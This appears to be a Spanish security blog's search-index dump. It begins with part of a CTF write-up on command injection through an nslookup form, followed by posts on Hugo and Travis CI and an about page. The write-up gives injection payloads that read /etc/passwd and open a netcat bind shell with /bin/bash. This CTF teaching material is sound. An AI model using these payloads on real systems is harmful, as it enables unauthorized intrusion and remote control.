de linux para obtener informacion de un dominio (concretamente, del DNS). su uso es sencillo, basta con poner ‘nslookup google.com’ para obtener los datos. Hay buenas razonas para pensar que este buscador esta ejecutando nslookup con los parámetros que le hemos indicado. ¿Será acaso posible correr más de un comando? ¡Vamos a averiguarlo!, para ello, imaginamos que, como en cualquier linea de terminal en linux, es posible ejecutar más de un solo comando. Para confirmar nuestra teoría podremos escribir un payload parecido al siguiente: (¿Quizás a esta altura deberíamos ofrecernos como diseñadores creativos de naming?) asdqweasdqe.com; cat /etc/passwd Lo que estamos haciendo se parece a decirle al sitio “hey! quiero revisar este dominio (cualquiera), y luego ejecuta el comando cat al archivo de /etc/passwd”. Como vemos, nuestra prueba funciona y ya sabemos también algunas cosas más del servidor. Una vez que hayamos descubierta una vulnerabilidad como esta, ya podemos correr todo tipo de comandos. Por ejemplo, como en el caso del payload anterior, podemos intentar conseguir una shell. En este caso lo que haremos será correr netcat del lado del servidor, esperando una conexión remota: bhf.com.ar; nc -lp 4444 -e /bin/bash los flags de netcat usados aquí son: --listen para dejar en modo escucha el puerto.\r--port 4444 indica el puerto por el cual nos conectaremos.\r--execute indica al servidor que corra un programa, en este caso\r/bin/bash, una vez que se establezca la conexión.\r Cuando hacemos nuestra consulta, vemos que el la pagina queda indefinidamente en pausa, ese es un signo bastante bueno cuando ejecutamos payloads que dejan servicios corriendo del lado del servidor. ¡Ahora debemos conectarnos! para ello, usamos netcat nuevamente, desde nuestra propia terminal: nc gdg-ctf.hostear.com.ar -v 4444 Podemos usar la ip o el dominio. Por otro lado hemos activado el flag --verbose para obtener más información. Con ello, ya tendremos acceso al servidor. ","date":"08-02-2020","objectID":"/deerhost/:4:0","tags":["write-up"],"title":"[Write-up] Deerhost","uri":"/deerhost/"},{"categories":[],"content":"Notas finales Aunque deerhost presente a simple vista un escenario muy sencillo y puede vulnerarse con facilidad, su riqueza esta en ser más realista de lo que uno se imagina. Para quienes recién comienzan a tomar conciencia de la importancia de la ciberseguridad puede ser muy útil hacer las pruebas localmente, y por supuesto ver que más pueden encontrar. El repositorio de github se encuentra abierto a todos aquellos que quieran probarlo gdg-rce-ctf Happy Hacking! ","date":"08-02-2020","objectID":"/deerhost/:5:0","tags":["write-up"],"title":"[Write-up] Deerhost","uri":"/deerhost/"},{"categories":["github","ci/cd","automatizacion","blog"],"content":"Si algo caracteriza a muchos de los que trabajamos en sistemas es la aversión por hacer tareas repetitivas y monótonas, siempre que podamos vamos a recurrir a la automatización, de esta manera nos queda mas tiempo para atender cosas importantes, aprender cosas nuevas o simplemente por el reto que significa automatizar esa tarea que tanto nos fastidia hacerla manualmente. ","date":"06-18-2020","objectID":"/deploy-hugo-pages/:0:0","tags":["github","ci/cd","automatizacion","blog"],"title":"Automatizando el deploying del blog con Hugo y Travis.","uri":"/deploy-hugo-pages/"},{"categories":["github","ci/cd","automatizacion","blog"],"content":"Como funciona este blog? Primero comencemos por como funciona este blog, como comente anteriormente esta pagina esta creado con Hugo el cual mediante archivos Markdown genera archivos estáticos que pueden ser hosteados directamente en cualquier servidor web sin mas requisitos. Para comenzar cree 2 repositorios de github, el primero es para mantener versionadas las entradas y configuración de este blog, el segundo es para hospedar mediante el servicio GitHub Pages y olvidarme de tener que mantener mi propio web server. En un comienzo el proceso consistía en modificar o crear entradas, realizar manualmente en mi computadora el proceso de “build” mediante Hugo y enviar los archivos generados al segundo repositorio de github para ser visto mediante GitHub Pages. Este proceso resulta un poco engorroso ya que cada cambio necesita de resubir nuevamente los archivos modificados o nuevos. ","date":"06-18-2020","objectID":"/deploy-hugo-pages/:1:0","tags":["github","ci/cd","automatizacion","blog"],"title":"Automatizando el deploying del blog con Hugo y Travis.","uri":"/deploy-hugo-pages/"},{"categories":["github","ci/cd","automatizacion","blog"],"content":"Automatizando el deploy mediante Travis Travis CI y GithubTravis \"\rTravis CI y Github\r Mediante Travis CI podemos automatizar el build y despliegue de nuestro sitio en GitHub Pages, para comenzar debemos crearnos un token para que Travis pueda acceder a nuestros repositorios, esto lo vamos a hacer mediante la url https://github.com/settings/tokens/new Asignamos los permisos.TokenGithub \"\rAsignamos los permisos.\r Una vez creado nuestro token lo guardamos para poder utilizarlo mas adelante, luego nos logueamos en Travis CI con nuestra cuenta de github y habilitamos el repositorio donde estan los archivos de nuestro blog en basado en Hugo. Habilitamos el repositorio.Activar repositorio travis \"\rHabilitamos el repositorio.\r En la configuración del repositorio agregamos la variable de entorno “GITHUB_TOKEN” con nuestro token generado anteriormente Configuramos nuestro repositorio en travis.Configuracion travis \"\rConfiguramos nuestro repositorio en travis.\r Por ultimo necesitamos agregar el archivo .travis.yml a nuestro repositorio para que travis sepa como construir el sitio en mi caso con el siguiente contenido. install:- curl-LOhttps://github.com/gohugoio/hugo/releases/download/v0.74.3/hugo_extended_0.74.3_Linux-64bit.deb- sudodpkg-ihugo_extended_0.72.0_Linux-64bit.debscript:- hugo# This commands builds your website on travisdeploy:local_dir:public# El directorio donde hugo va a generar los archivos estaticosrepo:duality084/duality084.github.io# El repositorio donde se va a hacer el deploytarget_branch:master# GitHub pages branch to deploy to (in other cases it can be gh-pages)provider:pages#El \"provider\" en este caso \"pages\" que nos va a dar las funcionalidades de \"Github Pages\" especificados mas adelanteskip_cleanup:truegithub_token:$GITHUB_TOKEN# el token de autenticacion que pusimos como variable de entorno en el dashboard de travis.email:asd@asd.comname:\"Ramirez Matias\"fqdn:bhf.com.ar# Especificamos nuestro dominio si no vamos el asignado por github *.github.io, caso contrario borramos esta lineaon:branch:master Con esto ya tenemos todo armado para que Travis construya nuestro sitio con Hugo cada vez que hagamos un cambio en nuestro repositorio, ahora solo nos dedicamos a escribir sin tener que preocuparnos por nada mas. ","date":"06-18-2020","objectID":"/deploy-hugo-pages/:2:0","tags":["github","ci/cd","automatizacion","blog"],"title":"Automatizando el deploying del blog con Hugo y Travis.","uri":"/deploy-hugo-pages/"},{"categories":["selfhosted"],"content":"¿Que es hugo? Hugo es un generador de sitios estáticos en el cual mediante un archivo configuración, archivos Markdown o HTML podemos crear sitios o blogs(en este caso este mismo blog). ","date":"06-17-2020","objectID":"/creando-blog-con-hugo/:1:0","tags":["content","Markdown"],"title":"Creando Blog Con Hugo","uri":"/creando-blog-con-hugo/"},{"categories":["selfhosted"],"content":"¿Por que no usar un CMS? Un CMS o Content Management System es un software el cual nos facilita administrar y publicar contenido en un sitio web, algunos ejemplos pueden ser Wordpress, Joomla, Drupal, etc. Estos sistemas se encuentran programados en distintos lenguajes de programación y constan de varias partes para su correcto funcionamiento como puede ser una base de datos, el lenguaje sobre el cual se ejecuta, las librerías utilizadas por la aplicación, el servidor web el cual se encarga de recibir las peticiones(NGINX, Apache, etc), muchas veces estos sistemas a su vez permiten mediante plugins agregar funcionalidades. Teniendo esto en cuenta podemos inferir que administrar un CMS puede ser una tarea que consume bastante recursos, y tiempo en mantener todo actualizado y al dia para prevenir intrusiones de seguridad, de todas maneras hablando a nivel seguridad la superficie de ataque en un CMS es muy amplia. Si bien todo depende de los casos de uso, para mi caso particular un blog, tener un servidor con Linux + MySQL + PHP + servidor web + el tiempo y mantenimiento que conlleva no se justifica, con Hugo simplemente genero un nuevo archivo Markdown para una nueva entrada lo subo a mi repositorio de git luego Hugo se encarga de la creación de todos los archivos estáticos para su publicación y solo necesito de un servidor web(Nginx, Apache,Lighttpd, etc) por lo cual el mantenimiento es mínimo, o simplemente hospedo los archivos mediante Github Pages ","date":"06-17-2020","objectID":"/creando-blog-con-hugo/:2:0","tags":["content","Markdown"],"title":"Creando Blog Con Hugo","uri":"/creando-blog-con-hugo/"},{"categories":["selfhosted"],"content":"Creando un sitio estático Aclaración Esto post no pretende ser un tutorial exhaustivo de como utilizar hugo para mas información por favor diríjase a la documentación Hugo consta de un solo binario el cual se puede descargar para distintas plataformas. Una vez descargado lo descomprimimos en el directorio que querramos y podemos crear un sitio con el siguiente comando. hugo new blog El comando nos va a crear nuestro sitio con todos los archivos y carpetas necesarias. archtypes content data layoutsgit resources static themes config.toml El archivo config.toml es el encargado de guardar toda la configuración para la construcción de nuestro sitio estático por ejemplo nombre, url, tema a utilizar, estructura de los menús, etc, en mi caso utilizo el tema LoveIt. Una vez configurado podemos empezar a crear los archivos Markdown e ir escribiendo distintas entradas para nuestro blog, los mismos van dentro la carpeta content y podemos crearlos con el siguiente comando o a mano. hugo new posts/example.md Por ultimo podremos ver como se ve nuestra pagina web mediante el siguiente comando. hugo server ","date":"06-17-2020","objectID":"/creando-blog-con-hugo/:3:0","tags":["content","Markdown"],"title":"Creando Blog Con Hugo","uri":"/creando-blog-con-hugo/"},{"categories":null,"content":"Hackingmemoryempty \"\rHacking\r Escena 1. Neuquén, Argentina - Ruido de teclados de fondo. Tres fanáticos de la ciberseguridad nacen por pura casualidad en la misma ciudad patagónica. Nunca se vieron la cara al mismo tiempo (culpa del COVID-19), pero comparten cientos de espacios virtuales en común. De repente -entre viajes místicos y runnings into the wild- descubren que ha llegado la hora de compartir su pasión con el resto de la humanidad. Ramirez MatiasRamirez Matias \"\rRamirez Matias\r ","date":"05-20-2020","objectID":"/about/:0:0","tags":null,"title":"About US","uri":"/about/"},{"categories":null,"content":"Ramirez Matias ¿Qué es esto lo puedo romper? Apasionado en hacer que el software funcione con otro proposito para el que fue creado. MemoryEmptymemoryempty \"\rMemoryEmpty\r ","date":"05-20-2020","objectID":"/about/:0:1","tags":null,"title":"About US","uri":"/about/"},{"categories":null,"content":"MemoryEmpty MemoryEmpty es amnésico por voto propio. Su obsesión y paranoia empuja al grupo a trabajar duro (y cuidarse las espaldas). Por lo general está programando o rompiendo el código de otros. Nunca lo hemos visto dormir. bronxibronxi \"\rbronxi\r ","date":"05-20-2020","objectID":"/about/:0:2","tags":null,"title":"About US","uri":"/about/"},{"categories":null,"content":"bronxi (A.K.A. benja) Curioso desde la infancia, bronxi desde la adolescencia. Siempre está leyendo algo y a veces se olvida de llevarlo a la práctica. Entiende los desafíos como videojuegos. Molesta con preguntas al al bhf team. ","date":"05-20-2020","objectID":"/about/:0:3","tags":null,"title":"About US","uri":"/about/"}]